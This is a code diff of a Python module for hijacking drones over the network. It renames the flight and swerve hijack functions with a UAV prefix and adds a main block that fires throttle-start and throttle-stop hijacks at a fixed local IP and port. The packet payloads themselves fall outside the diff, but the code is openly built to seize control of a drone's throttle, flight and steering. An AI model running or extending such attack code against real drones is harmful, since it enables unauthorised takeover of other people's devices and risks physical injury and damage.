@@ -43,7 +43,7 @@ def throttle_stop_hijack(device_ip, port):
     return f"Throttle stop hijack performed on {device_ip}:{port} successfully."
 
 
-def fly_hijack(device_ip, port):
+def uav_fly_hijack(device_ip, port):
     # 定义目标 IP 和端口
     dst_ip = device_ip
     dst_port = port
@@ -72,7 +72,7 @@ def fly_hijack(device_ip, port):
 
 
 
-def swerve_hijack(device_ip, port):
+def uav_swerve_hijack(device_ip, port):
     # 定义目标 IP 和端口
     dst_ip = device_ip
     dst_port = port
@@ -98,3 +98,11 @@ def swerve_hijack(device_ip, port):
     sock.close()
 
     return f"Swerve hijack performed on {device_ip}:{port} successfully."
+
+
+if __name__ == "__main__":
+    device_ip = "192.168.169.1"
+    port = 8800
+    throttle_start_hijack(device_ip, port)
+    sleep(3)
+    throttle_stop_hijack(device_ip, port)
